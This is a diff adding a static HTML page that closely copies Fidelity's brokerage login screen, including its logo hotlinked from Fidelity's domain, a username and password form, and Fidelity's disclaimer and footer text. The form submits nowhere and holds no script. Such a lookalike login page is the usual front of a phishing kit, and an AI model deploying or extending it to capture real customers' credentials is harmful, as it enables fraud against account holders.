@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Fidelity</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-family: Arial, Helvetica, sans-serif;
+                background-color: #F9F7F5;
+            }
+
+            .nav-bar {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                height: 64px;
+                padding: 0 32px;
+                background-color: #ffffff;
+            }
+
+            .nav-bar .logo img {
+                height: 33px;
+                display: block;
+            }
+
+            .nav-bar .nav-links {
+                display: flex;
+                align-items: center;
+                gap: 32px;
+                list-style: none;
+            }
+
+            .nav-bar .nav-links a {
+                color: #333333;
+                text-decoration: none;
+                font-size: 16px;
+                font-weight: 600;
+            }
+
+            .nav-bar .nav-links a:hover {
+                color: #1a7a3c;
+                text-decoration: underline;
+            }
+
+            .login-section {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding: 64px 16px 0;
+            }
+
+            .login-card {
+                width: 100%;
+                max-width: 464px;
+                background-color: #ffffff;
+                border-radius: 8px;
+                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+                border: 1px solid #d0d0d0;
+                padding: 54px 32px;
+                margin-top: 32px;
+            }
+
+            .login-card h1 {
+                font-size: 28px;
+                margin-bottom: 24px;
+            }
+
+            .form-group {
+                margin-bottom: 16px;
+            }
+
+            .form-group label {
+                display: block;
+                font-size: 14px;
+                font-weight: 700;
+                margin-bottom: 6px;
+            }
+
+            .form-group input[type="text"] {
+                width: 100%;
+                height: 44px;
+                padding: 0 12px;
+                font-size: 16px;
+                border: 1px solid #767676;
+                border-radius: 8px;
+            }
+
+            .form-group input[type="text"]:focus {
+                outline: 2px solid #1a7a3c;
+                outline-offset: -1px;
+            }
+
+            .password-field {
+                position: relative;
+            }
+
+            .password-field input {
+                width: 100%;
+                height: 44px;
+                padding: 0 44px 0 12px;
+                font-size: 16px;
+                border: 1px solid #767676;
+                border-radius: 8px;
+            }
+
+            .password-field button {
+                position: absolute;
+                right: 8px;
+                top: 50%;
+                transform: translateY(-50%);
+                background: none;
+                border: none;
+                cursor: pointer;
+                font-size: 18px;
+                padding: 6px;
+            }
+
+            .remember-me {
+                display: flex;
+                align-items: center;
+                gap: 8px;
+                margin-bottom: 24px;
+            }
+
+            .remember-me input {
+                width: 16px;
+                height: 16px;
+            }
+
+            .remember-me label {
+                font-size: 15px;
+            }
+
+            .login-btn {
+                width: 100%;
+                height: 48px;
+                background-color: #418442;
+                color: #ffffff;
+                border: none;
+                border-radius: 24px;
+                font-size: 16px;
+                font-weight: 700;
+                cursor: pointer;
+                margin-bottom: 20px;
+            }
+
+            .login-btn:hover {
+                background-color: #366b37;
+            }
+
+            .forgot-link {
+                display: block;
+                text-align: left;
+                font-size: 15px;
+                color: #1E3986;
+                text-decoration: underline;
+            }
+
+            .signup-line {
+                text-align: center;
+                font-size: 15px;
+                margin-top: 32px;
+                color: #333333;
+                margin-bottom: 52px;
+            }
+
+            .signup-line a {
+                color: #1E3986;
+                text-decoration: underline;
+            }
+
+            .disclaimer {
+                width: 100%;
+                max-width: 756px;
+                margin: 48px auto 0;
+                padding: 24px 16px 48px;
+                border-top: 1px solid #d0d0d0;
+                font-size: 13px;
+                color: #333333;
+            }
+
+            .disclaimer h2 {
+                font-size: 15px;
+                margin-bottom: 8px;
+            }
+
+            .disclaimer a {
+                color: #1E3986;
+                text-decoration: underline;
+            }
+
+            .disclaimer p {
+                margin-top: 12px;
+                line-height: 1.5;
+            }
+
+            .ext-icon {
+                font-size: 11px;
+                text-decoration: none;
+            }
+
+            .site-footer {
+                background-color: #ffffff;
+                padding: 20px 32px;
+                display: flex;
+                flex-direction: column;
+                align-items: flex-end;
+                gap: 4px;
+                margin-top: 32px;
+            }
+
+            .site-footer .copyright {
+                font-size: 13px;
+                color: #333333;
+            }
+
+            .site-footer .footer-links {
+                font-size: 13px;
+                color: #333333;
+            }
+
+            .site-footer .footer-links a {
+                color: #333333;
+                text-decoration: underline;
+            }
+
+            .site-footer .us-only {
+                font-size: 13px;
+                color: #333333;
+            }
+        </style>
+    </head>
+    <body>
+        <div>
+            <div class="nav-bar">
+                <div class="logo">
+                    <img src="https://digital.fidelity.com/prgw/digital/signin/assets/images/Fid_Wordmark-Logo_Green.svg" alt="Fidelity">
+                </div>
+                <ul class="nav-links">
+                    <li><a href="#">Security</a></li>
+                    <li><a href="#">FAQs</a></li>
+                </ul>
+            </div>
+            <div class="login-section">
+                <div class="login-card">
+                    <h1>Log in</h1>
+                    <form>
+                        <div class="form-group">
+                            <label for="username">Username</label>
+                            <input type="text" id="username" name="username" autocomplete="username">
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <div class="password-field">
+                                <input type="password" id="password" name="password" autocomplete="current-password">
+                                <button type="button" aria-label="Show password">&#128065;</button>
+                            </div>
+                        </div>
+                        <div class="remember-me">
+                            <input type="checkbox" id="remember" name="remember">
+                            <label for="remember">Remember my username</label>
+                        </div>
+                        <button type="submit" class="login-btn">Log in</button>
+                        <a href="#" class="forgot-link">Forgot username or password?</a>
+                    </form>
+                </div>
+                <p class="signup-line">New to Fidelity? <a href="#">Open an account</a> or <a href="#">sign up</a>.</p>
+
+                <div class="disclaimer">
+                    <h2>Disclaimer</h2>
+                    <a href="#">National Financial Services LLC Statement of Financial Condition <span class="ext-icon">&#8599;</span></a>
+                    <p>
+                        Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit
+                        </br><a href="#">browser encryption <span class="ext-icon">&#8599;</span></a>.
+                    </p>
+                    <p>
+                        Before investing, consider the funds&rsquo; investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.
+                    </p>
+                    <p>
+                        Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917
+                    </p>
+                    <p>
+                        1159659.2.0
+                    </p>
+                </div>
+            </div>
+            <div class="site-footer">
+                <div class="copyright">Copyright 1998-2026 FMR LLC. All rights reserved.</div>
+                <div class="footer-links">
+                    <a href="#">Terms of Use <span class="ext-icon">&#8599;</span></a> |
+                    <a href="#">Privacy Policy <span class="ext-icon">&#8599;</span></a> |
+                    <a href="#">Security <span class="ext-icon">&#8599;</span></a> |
+                    <a href="#">Accessibility <span class="ext-icon">&#8599;</span></a> |
+                    <a href="#">Share Your Screen</a>
+                </div>
+                <div class="us-only">This is for persons in the U.S. only. <span class="ext-icon">&#8599;</span></div>
+            </div>
+        </div>
+    </body>
+</html>
